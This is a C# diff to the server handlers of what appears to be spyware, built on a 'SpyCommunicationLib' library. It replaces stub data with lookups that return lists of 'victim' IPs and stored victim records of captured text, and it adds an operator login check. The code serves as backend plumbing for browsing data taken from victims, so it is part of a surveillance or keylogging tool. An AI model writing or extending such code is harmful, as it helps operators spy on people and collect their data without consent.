@@ -1,4 +1,5 @@
 ﻿
+using Server.Data;
 using SpyCommunicationLib;
 using SpyCommunicationLib.Directors;
 using SpyCommunicationLib.Entities;
@@ -25,11 +26,8 @@ namespace Server.Handlers
             if (!clientInfo.IsAuthorized)
                 return _director.GetUnauthorizedResponse().ToString();
 
-            // Add connection to DB for get data
-            List<string> ip_list = new List<string>()
-            {
-                "127.0.0.1", "123.2.1.0"
-            };
+            List<string> ip_list = Data.RecordsContainer.GetVictimsIps();
+
             return _director.GetVictimsIpListResponse(ip_list).ToString();
         }
 
@@ -38,15 +36,8 @@ namespace Server.Handlers
             if (!clientInfo.IsAuthorized)
                 return _director.GetUnauthorizedResponse().ToString();
 
-            // Add connection to DB for get data
-            List<VictimRecord> records = new List<VictimRecord>() { 
-                new VictimRecord{
-                    Id = 1,
-                    Date = new DateTime(2020, 10, 31),
-                    VictimIp = victimIp,
-                    Text = "1111111111111"
-                }
-            };
+            string ip = clientInfo.RemoteEndPoint.Split(":")[0];
+            List<VictimRecord> records = Data.RecordsContainer.GetRecordsByIp(ip);
 
             return _director.GetVictimRecordsResponse(records).ToString();
         }
@@ -56,7 +47,8 @@ namespace Server.Handlers
             if (username == String.Empty || password == String.Empty)
                 return _director.GetUnauthorizedResponse().ToString();
 
-            // Add check on autorisation
+            if (!UsersContainer.UserCheck(username, password))
+                return _director.GetUnauthorizedResponse().ToString();
 
             clientInfo.SetAuthorization(username);
             return _director.GetSuccessResponse().ToString();
